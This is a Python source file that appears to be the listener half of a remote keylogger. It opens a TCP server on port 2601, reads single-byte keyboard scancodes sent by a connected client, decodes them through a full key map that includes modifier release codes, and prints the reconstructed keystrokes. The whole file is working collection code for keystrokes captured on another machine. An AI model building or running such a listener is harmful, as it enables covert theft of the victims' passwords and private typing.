import socket

RED = "\033[31m"

RESET = "\033[0m"

SCANCODE_TO_KEY = {

    2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    12: '-', 13: '=', 14: f'{RED}[backspace]{RESET}',
    
    15: f'{RED}[tab]{RESET}', 16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
    26: '[', 27: ']', 28: f'{RED}[enter]{RESET}',
    
    29: f'{RED}[left ctrl]{RESET}', 30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k', 38: 'l',
    39: ';', 40: '\'', 41: '`',
    
    42: f'{RED}[left shift]{RESET}', 43: '\\', 44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm',
    51: ',', 52: '.', 53: '/', 54: f'{RED}[right shift]{RESET}',
    
    55: '*', 56: f'{RED}[left alt]{RESET}', 57: f'{RED}[space]{RESET}', 58: f'{RED}[caps lock]{RESET}',

    59: f'{RED}[f1]{RESET}', 60: f'{RED}[f2]{RESET}', 61: f'{RED}[f3]{RESET}', 62: f'{RED}[f4]{RESET}', 63: f'{RED}[f5]{RESET}', 64: f'{RED}[f6]{RESET}', 65: f'{RED}[f7]{RESET}', 66: f'{RED}[f8]{RESET}', 67: f'{RED}[f9]{RESET}', 68: f'{RED}[f10]{RESET}',
    87: f'{RED}[f11]{RESET}', 88: f'{RED}[f12]{RESET}',

    69: f'{RED}[num lock]{RESET}', 70: f'{RED}[scroll lock]{RESET}',
    71: f'{RED}[home]{RESET}', 72: f'{RED}[up]{RESET}', 73: f'{RED}[page up]{RESET}', 75: f'{RED}[left]{RESET}', 77: f'{RED}[right]{RESET}', 79: f'{RED}[end]{RESET}', 80: f'{RED}[down]{RESET}', 81: f'{RED}[page down]{RESET}', 82: f'{RED}[insert]{RESET}', 83: f'{RED}[delete]{RESET}',
    
    55: '*', 74: '-', 78: '+', 96: f'{RED}[enter]{RESET}',
    98: '/', 99: f'{RED}[kp1]{RESET}', 100: f'{RED}[kp2]{RESET}', 101: f'{RED}[kp3]{RESET}', 102: f'{RED}[kp4]{RESET}', 103: f'{RED}[kp5]{RESET}', 104: f'{RED}[kp6]{RESET}', 105: f'{RED}[kp7]{RESET}', 106: f'{RED}[kp8]{RESET}', 107: f'{RED}[kp9]{RESET}', 108: f'{RED}[kp0]{RESET}', 109: '.',
    
    170: f'{RED}[release left shift]{RESET}', 182: f'{RED}[release right shift]{RESET}', 184: f'{RED}[release left alt]{RESET}', 157: f'{RED}[release left ctrl]{RESET}',
    
    183: f'{RED}[print screen]{RESET}', 197: f'{RED}[pause/break]{RESET}',
    
}

def scancode_to_key(scancode):
    return SCANCODE_TO_KEY.get(scancode, '')

def start_server(host="0.0.0.0", port=2601):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen()
        print(f"Server listening on {host}:{port}")

        while True:
            conn, addr = server_socket.accept()
            with conn:
                print(f"Connected by {addr}")

                while True:
                    data = conn.recv(1)
                    if not data:
                        break

                    scancode = int.from_bytes(data)
                    key = scancode_to_key(scancode)
                    print(key,end="")

                print("End of transmission")


if __name__ == "__main__":
    start_server()

